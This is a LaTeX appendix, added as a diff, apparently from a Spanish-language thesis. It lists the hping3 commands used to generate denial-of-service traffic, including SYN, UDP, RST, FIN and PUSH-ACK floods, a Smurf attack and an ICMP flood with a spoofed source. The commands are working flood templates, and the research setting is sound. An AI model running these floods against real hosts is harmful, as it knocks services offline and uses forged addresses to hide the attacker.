@@ -1,0 +1,36 @@
+% Appendix Template
+
+\chapter{Comandos de Hping3 utilizados} % Main appendix title
+
+\label{AppendixA} % Change X to a consecutive letter; for referencing this appendix elsewhere, use \ref{AppendixX}
+Los comandos de Hping3 utilizados para la generación de los ataques son los que se muestran en la Tabla \ref{tabla:comandos_hping3}. Para mayor información, consultar en \parencite{hping3_man}.\\
+
+
+\begin{table}[htbp]
+	\centering
+	\begin{tabular}{|l|l|}
+		\hline
+		\cellcolor[HTML]{EFEFEF}\textbf{Ataque}    & \cellcolor[HTML]{EFEFEF}\textbf{Comando}                                                                               \\ \hline
+		TCP SYN flood      & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -S -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
+		UDP flood          & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -{}-udp -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
+		Smurf              & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -{}-icmp -{}-flood -{}-spoof \textless{}IP host} \\ \texttt{víctima\textgreater \textless{}IP broadcast\textgreater  {[}-d tamaño del paquete{]}} \\ \texttt{{[} -{}-interval tiempo de espera entre envío de}\\ \texttt{paquetes{]}}\end{tabular} 
+		\\ \hline
+		TCP RESET flood    & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -R -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
+		TCP FIN flood      & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -F -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater  {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
+		TCP SYN FIN flood  & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -SF -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
+		TCP PUSH ACK flood & 
+	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -PA -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater  {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
+	\begin{tabular}[c]{@{}l@{}} ICMP flood con\\ dirección de origen\\ falsificada y dirección\\ de destino distinta a la\\ de difusión \end{tabular} & 
+\begin{tabular}[c]{@{}l@{}}
+\texttt{hping3 -{}-icmp -{}-flood \textless{}IP host víctima\textgreater {[}-a IP} \\ \texttt{de origen falsificada{]}}\end{tabular}         \\ \hline
+	
+	\end{tabular}
+	\caption{Comandos Hping3 utilizados.}
+	\label{tabla:comandos_hping3}
+\end{table}
